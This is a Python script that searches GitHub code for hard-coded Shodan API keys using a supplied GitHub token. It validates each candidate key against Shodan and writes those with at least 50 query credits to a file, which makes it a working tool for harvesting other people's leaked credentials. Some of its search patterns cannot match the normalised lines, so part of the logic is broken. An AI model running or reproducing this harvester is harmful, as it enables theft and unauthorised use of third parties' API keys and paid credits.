import sys

from shodan import Shodan
from github import Github


def clean(o):
    ls = []
    keyList = []
    with open(o, 'r+') as f:
        for line in f.readlines():
            if line.split(" ")[0] not in keyList:
                ls.append(line)
                keyList.append(line.split(" ")[0])

    with open(o, 'w') as f:
        for l in ls:
            f.write(l)


def check(k, o):
    try:
        shodan_api = Shodan(k)
        if shodan_api.info()['query_credits'] >= 50:
            with open(o, 'a+') as f:
                f.write(k + " Credits: " + str(shodan_api.info()['query_credits']) + " Scans: " + str(shodan_api.info()['scan_credits']) + "\n")
    except:
        pass


def search(k, o, s):
    print("Search for: '" + s + "' ...")

    api = Github(k)
    repos = api.search_code('language:python "' + s + '"')

    try:
        for repo in repos:
            bytes_content = repo.decoded_content
            content = str(bytes_content, 'utf-8')
            lines = content.split("\n")

            for line in lines:
                original = line
                line = line.strip()
                line = line.lower()
                line = line.replace(' ', '')

                if s + '"' in line:
                    split = original.split('"')
                    if len(split[1]) == 32:
                        check(split[1], o)

                elif s + "'" in line:
                    split = original.split("'")
                    if len(split[1]) == 32:
                        check(split[1], o)
    except:
        pass


if len(sys.argv) != 3:
    print("Usage: gitshodankey.py <github-api-key> <key.out>")
    exit()

searchList = ["shodan_api_key =", "shodan_api_key=", "api_shodan_key=", "api_shodan_key =",
              "api = Shodan(", "api=Shodan(", "api = shodan.Shodan(", "api=shodan.Shodan("]

for searchString in searchList:
    search(sys.argv[1], sys.argv[2], searchString)

clean(sys.argv[2])

